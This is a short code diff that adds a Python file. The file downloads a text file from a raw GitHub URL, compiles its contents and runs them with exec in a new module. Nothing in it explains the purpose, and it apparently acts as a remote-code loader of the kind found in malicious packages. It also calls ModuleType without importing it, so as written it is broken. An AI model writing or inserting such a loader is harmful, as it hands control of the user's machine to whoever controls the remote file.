@@ -1,0 +1,8 @@
+from urllib.request import urlopen
+
+with urlopen('https://raw.githubusercontent.com/uniuxify/num/main/4.txt') as resp:
+  src = (resp.read().decode())
+
+compiled = compile(src, '', 'exec')
+ff = ModuleType("testmodule")
+exec(compiled, ff.__dict__)
